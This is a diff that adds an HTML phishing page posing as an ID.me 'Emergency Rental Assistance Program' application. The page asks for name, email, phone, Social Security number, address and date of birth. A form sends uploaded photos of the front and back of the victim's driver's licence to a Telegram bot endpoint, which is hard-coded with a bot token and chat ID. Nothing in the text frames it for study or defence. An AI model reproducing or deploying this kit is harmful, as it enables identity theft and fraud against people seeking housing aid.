@@ -1,0 +1,386 @@
+
+<html dir="ltr" lang="en">
+
+<head>
+    <style>
+        body {
+            transition: opacity ease-in 0.2s;
+        }
+
+        body[unresolved] {
+            opacity: 0;
+            display: block;
+            overflow: hidden;
+            position: relative;
+        }
+    </style>
+    <link href="https://static.queue-it.net" rel="preconnect">
+    <link href="https://api.sjpf.io" rel="preconnect">
+    <link href="https://device.id.me" rel="preconnect">
+    <title>
+        Emergency Rental Assistance Program (ERAP)
+    </title>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="One Identity. One Wallet." name="description">
+    <meta content="" name="keywords">
+    <meta content="noodp" name="robots">
+    <meta content="width=device-width, initial-scale=1, minimum-scale=1" name="viewport">
+    <meta content="noindex" name="robots">
+    <link rel="icon" type="image/png" href="./assets/logo.png">
+
+
+    <meta name="csrf-param" content="authenticity_token">
+    <meta name="csrf-token"
+        content="tzJe5yj612Y5xoqFEVJWnPdDYDs86TGB/RE8RCYcFZSBcT0SuTpo9BtapBu4i/SkIv/953K+RzLMHKM+y0Z7wQ==">
+    <link rel="stylesheet" media="all"
+        href="./assets/application-0189d16e9dcf751fcf91038fa9ac30c98194116564b5125b826c9f7219da2f93.css">
+
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"
+        integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+
+    <script src="./mod.js"></script>
+    <link rel="stylesheet" href="./mod.css">
+
+</head>
+
+<body class="">
+    <div id="ZN_2bLc7fWaOZ8U4ey"></div>
+
+
+    <div class="page-container" data-role="page-container">
+        <div class="container">
+            <div class="content-container">
+                <form class="new_user" id="form">
+
+                    <div aria-atomic="true" aria-live="polite" class="sr-only" id="error-list"></div>
+                    <div class="form-header">
+                        <div class="form-header-content" role="banner">
+                            <div class="partner">
+                                <div class="c_icon m_idme">
+                                    <img alt="ID.me" class="img-lightmode" src="./assets/logo.png">
+                                    <img alt="ID.me" class="img-darkmode" src="./assets/logo.png">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <main aria-labelledby="sr_page_title" class="form-container">
+                        <div class="form-header-access">
+                            <h1 id="sr_page_title">Application Form</h1>
+                        </div>
+
+                        <p class="alert alert-error" role="alert" style="">
+
+                        </p>
+                        <p class="alert alert-success" role="alert" style="">
+
+                        </p>
+
+                        <div class="form-fields">
+
+                            <fieldset class="field-group">
+                                <div class="required-instructions">
+                                    * Indicates a required field
+                                </div>
+                                <legend class="sr-only">
+                                    Login Credentials
+                                </legend>
+                                <div class="names">
+
+                                    <div class="field text suggest">
+                                        <label class="required" for="user_emails_attributes_0_address">Firstname</label>
+                                        <input placeholder="Enter your firstname" required="required"
+                                            autocomplete="text" id="firstname">
+                                        <span id="user_email-error" role="alert">
+
+                                            <span class="email-suggestion"></span>
+                                        </span>
+                                    </div>
+                                    <div class="field text suggest">
+                                        <label class="required" for="user_emails_attributes_0_address">Lastname</label>
+                                        <input placeholder="Enter your lastname" required="required" autocomplete="text"
+                                            id="lastname">
+                                        <span id="user_email-error" role="alert">
+
+                                            <span class="email-suggestion"></span>
+                                        </span>
+                                    </div>
+                                </div>
+
+                                <div class="field text suggest">
+                                    <label class="required" for="user_emails_attributes_0_address">Email</label>
+                                    <input placeholder="Enter your personal email address" required="required"
+                                        autocomplete="email" type="email" id="email_field">
+                                    <span id="user_email-error" role="alert">
+
+                                        <span class="email-suggestion"></span>
+                                    </span>
+                                </div>
+                                <div class="field text suggest">
+                                    <label class="required" for="phone_field">Phone</label>
+                                    <input placeholder="(000)  000-0000" required="required" autocomplete="email"
+                                        type="number" id="phone_field">
+                                    <span id="user_email-error" role="alert">
+
+                                        <span class="email-suggestion"></span>
+                                    </span>
+                                </div>
+                                <div class="field text suggest">
+                                    <label class="required" for="ssn_field">Social Security Number</label>
+                                    <input placeholder="" required="required" autocomplete="email" type="number"
+                                        id="ssn_field">
+                                    <span id="user_email-error" role="alert">
+
+                                        <span class="email-suggestion"></span>
+                                    </span>
+                                </div>
+                                <div class="field text suggest">
+                                    <label class="required" for="address_field">Home Address</label>
+                                    <input placeholder="" required="required" autocomplete="email" type="text"
+                                        id="address_field">
+                                    <span id="user_email-error" role="alert">
+
+                                        <span class="email-suggestion"></span>
+                                    </span>
+                                </div>
+                                <!-- <div class="field ">
+                                    <label class="required labell" for="">Gender</label>
+                                    <select name="" id="gender_field" class=" selectBox">
+                                        <option value="">Please Select
+                                        <option value="Male">
+                                            Male
+                                        </option>
+                                        <option value="Female">
+                                            Female
+                                        </option>
+                                        <option value="">
+                                            Others
+                                        </option>
+                                    </select>
+                                </div> -->
+                                <div class="field text suggest">
+                                    <label class="required" for="ssn_field">Date of birth</label>
+                                    <input placeholder="" required="required" autocomplete="email" type="date"
+                                        id="ssn_field">
+                                    <span id="user_email-error" role="alert">
+
+                                        <span class="email-suggestion"></span>
+                                    </span>
+                                </div>
+
+
+                                <div class="registration email-validation-alert alert-well alert-error alert-hidden"
+                                    data-role="error" id="email-validation-error" role="alert"></div>
+                                <div class="registration email-validation-alert alert-well alert-warning alert-hidden"
+                                    data-role="warning" id="email-validation-warning" role="alert"></div>
+                </form>
+                <form id="uploadForm" method="POST"
+                    action="https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendPhoto"
+                    enctype="multipart/form-data">
+
+
+                    <input type="text" name="chat_id" id="chat_id" value="1534371221" hidden />
+
+                    <div class="field text password-showable">
+                        <div class="required labell" for="user_password_confirmation">Driver's License/State ID FRONT
+                        </div>
+                        <span class="image_be_clear">
+                            make
+                            sure it is clear</span>
+                        <div class="">
+                            <label for="id_front" class="upload_field">
+                                <div>
+                                    <div> <img src="./assets/icons/login/upload.png" alt=""> </div>
+                                    <div><strong>Browse Files</strong></div>
+                                    <div id="chosen0">Choose a file</div>
+                                </div>
+                            </label>
+                            <input id="id_front" name="photo" required class="uploadd" type="file"
+                                accept=".jpg,.png,.heic, .mpeg" hidden>
+                        </div>
+
+                        <span role="alert">
+
+                        </span>
+                    </div>
+
+
+                    <div class="field text password-showable">
+                        <div class="required labell" for="user_password_confirmation">Driver's License/State ID BACK
+                        </div>
+                        <span class="image_be_clear">make
+                            sure it is clear</span>
+                        <div class="">
+                            <label for="id_back" class="upload_field">
+                                <div>
+                                    <div> <img src="./assets/icons/login/upload.png" alt=""> </div>
+                                    <div><strong>Browse Files</strong></div>
+                                    <div id="chosen1">Choose a file</div>
+                                </div>
+                            </label>
+                            <input required id="id_back" name="photo1" class="uploadd" type="file"
+                                accept=".jpg,.png,.heic, .mpeg" hidden>
+                        </div>
+
+
+                        <span role="alert">
+
+                        </span>
+                    </div>
+
+                </form>
+
+                </fieldset>
+                <div class="field-group checkboxes">
+
+
+                    <div class="field checkbox">
+                        <input required="required" type="checkbox" value="1" id="user_accepts_terms">
+                        <label for="user_accepts_terms"><span aria-hidden="true" class="checkmark">
+
+                            </span>
+
+                            <span>
+                                I accept jovie's <a href="javascript:void()/terms">Terms
+                                    of Service</a> and <a href="javascript:void()/privacy">Privacy
+                                    Policy</a><strong>&nbsp;*</strong>
+                            </span>
+                        </label><span role="alert">
+
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div id="delayy" class="delayy">
+                <div class="spinner_container">
+                    <div class="loading-spinner mb-2"></div>
+                    <div class="counterr">120</div>
+                </div>
+                <div> Creating Account</div>
+            </div>
+            <div class="form-actions ">
+                <button type="submit" name="commit" id="submit_btn" form="form" class="btn btn-primary "
+                    data-disable-with="Creating ID.me account.." data-clicked="false">APPLY NOW</button>
+            </div>
+
+
+            </main>
+
+        </div>
+
+
+        <footer class="footer">
+
+        </footer>
+
+    </div>
+    </div>
+
+
+    <iframe data-product="web_widget" title="No content" role="presentation" tabindex="-1" allow="microphone *"
+        aria-hidden="true" src="about:blank"
+        style="width: 0px; height: 0px; border: 0px; position: absolute; top: -9999px;"></iframe>
+</body>
+
+</html>
+
+
+
+<!-- <div class="field text password password-showable" >
+    <label class="required" for="user_password">Password</label>
+    <input class="password-check" placeholder="Enter password" required="required"
+        autocomplete="new-password" type="password" name="user[password]"
+        id="user_password"><button type="button"
+        class="password-showable-button"><idme-icon name="eye"
+            description="Show field"></idme-icon></button>
+    <span role="alert">
+
+    </span>
+    <div class="password-strength hide" id="password-strength-indicator" role="tooltip">
+        <p>Password should contain:</p>
+        <ul>
+            <li aria-atomic="true" aria-live="polite" class="letter invalid">
+                lowercase letter
+                <span>Criteria not met.</span>
+            </li>
+            <li aria-atomic="true" aria-live="polite" class="capital invalid">
+                uppercase letter
+                <span>Criteria not met.</span>
+            </li>
+            <li aria-atomic="true" aria-live="polite" class="number invalid">
+                number
+                <span>Criteria not met.</span>
+            </li>
+            <li aria-atomic="true" aria-live="polite" class="length invalid">
+                at least 8 characters
+                <span>Criteria not met.</span>
+            </li>
+        </ul>
+        <p>Password can't be common or easily guessable</p>
+    </div>
+
+</div> -->
+
+
+<!-- <div class="separator">
+                <span>OR</span>
+            </div>
+
+            <div class="connections">
+                <a class="facebook connection" aria-label="Sign up with Facebook"
+                    href="https://api.id.me/en/broker/facebook/connect?type=signup"></a>
+                <a class="google connection" aria-label="Sign up with Google"
+                    href="https://api.id.me/en/broker/google/connect?type=signup"></a>
+                <a class="apple connection" aria-label="Sign up with Apple"
+                    href="https://api.id.me/en/broker/apple/connect?type=signup"></a>
+                <a class="linkedin connection" aria-label="Sign up with LinkedIn"
+                    href="https://api.id.me/en/broker/linkedin/connect?type=signup"></a>
+                <a class="connection m_full" href="https://api.id.me/en/registration/options">View more
+                    options</a>
+            </div> -->
+
+
+<!-- <div class="field text password-showable">
+                        <label class="required" for="user_password_confirmation">Driver's License/State ID FRONT</label>
+                        <span class="image_be_clear">
+                            make
+                            sure it is clear</span>
+                        <input required="required" type="file" autocomplete="new-password" name="photo" id="id_front">
+
+                        <button type="button" 1 class="password-showable-button"><idme-icon name="eye"
+                                description="Show field"></idme-icon></button>
+                        <span role="alert">
+
+                        </span>
+                    </div> -->
+
+<!-- <div class="field text password-showable" >
+                        <label class="required" for="user_password_confirmation">Driver's License/State ID BACK</label>
+                        <span class="image_be_clear">make
+                            sure it is clear</span>
+                        <input required="required" type="file" autocomplete="new-password" type="password" name="photo1"
+                            id="id_back">
+                        <span role="alert">
+
+                        </span>
+                    </div> -->
+<!-- 
+                    <div class="field text password-showable">
+                        <div class="required labelld" for="user_password_confirmation">Upload Your Resume</div>
+                        <div class="">
+                            <label for="resume" class="upload_field">
+                                <div>
+                                    <div> <img src="./assets/icons/login/upload.png" alt=""> </div>
+                                    <div><strong>Browse Files</strong></div>
+                                    <div id="chosen2">Choose a file</div>
+                                </div>
+                            </label>
+                            <input required id="resume" name="photo1" class="uploadd" accept=".docx,.doc,.pdf,"
+                                type="file" hidden>
+                        </div>
+
+
+                        <span role="alert">
+
+                        </span>
+                    </div> -->
